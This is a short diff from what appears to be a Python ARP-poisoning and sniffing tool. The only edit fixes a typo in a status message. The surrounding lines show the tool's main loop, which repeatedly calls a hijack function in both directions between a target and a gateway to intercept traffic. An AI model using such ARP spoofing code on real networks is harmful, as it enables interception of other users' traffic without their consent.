@@ -59,7 +59,7 @@ except KeyboardInterrupt:
     quit()
 try:
     timing(x=Fore.GREEN + "Started= ")
-    print(Fore.WHITE + "ARP Poisoning launch...\nAlso sniffing...")
+    print(Fore.WHITE + "ARP Poisoning launched...\nAlso sniffing...")
     while True:
         hijack(t_ip, t_mac, gateway)
         hijack(gateway, gateway_mac, t_ip)
